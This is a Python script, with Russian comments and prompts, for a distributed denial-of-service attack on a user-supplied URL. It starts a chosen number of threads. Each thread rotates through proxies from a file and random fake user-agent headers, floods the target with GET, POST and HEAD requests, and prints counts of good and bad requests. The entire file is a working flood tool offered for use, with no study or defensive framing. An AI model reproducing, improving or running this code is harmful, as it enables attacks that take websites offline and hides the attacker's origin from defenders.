import requests  # pip install requests
import threading
import fake_useragent  # pip install fake_useragent

from colorama import init, Fore, Back, Style
from time import sleep

while 1:
	try:
		threads_count = int(input('Потоки: '))
		url = input('URL: ')
		break
	except: pass


proxy_dict = {'http' : '0.0.0.0'}
init(convert=True)

info = Fore.WHITE + '[' + Fore.BLUE + 'INFO' + Fore.WHITE + ']'
f = open('proxy.txt', 'r').readlines()

str_refresh = 1
good_requests = 0
bad_requests = 0
def ddos():  # Дудосит
	global str_refresh
	global good_requests
	global bad_requests

	sleep(2)
	for i in range(20):  # 20 проходов по proxy.txt
		# Создаём фэйк хедер
		user = fake_useragent.UserAgent().random
		header = {'user-agent': user}
		for proxy in f:

			proxy_dict['http'] = 'http://'+proxy

			try:
				str_refresh += 1
				if str_refresh >= 40:
					str_refresh = 1
					print('\r{info} Good/Bad requests: {request}'.format(info=info,
					request=Fore.GREEN+str(good_requests)+Fore.WHITE+'/'+Fore.RED+str(bad_requests)+Fore.WHITE), end='')

				# Запросы
				request = requests.get(url, proxies = proxy_dict, headers = header, timeout = 3)
				good_requests += 1

				request = requests.post(url, proxies = proxy_dict, headers = header, timeout = 3)
				good_requests += 1

				request = requests.head(url, proxies = proxy_dict, headers = header, timeout = 3)
				good_requests += 1
			except: bad_requests += 1
			# except Exception as error: print(error)

# Запускаем потоки
threads = []
for i in range(threads_count):
	t = threading.Thread(target=ddos, args=())
	threads.append(t)
	t.start()
	print('\r{} Поток {}/{} запущен'.format(info, i+1, threads_count ), end='')
print('\n'+info+' Отправка запросов...')
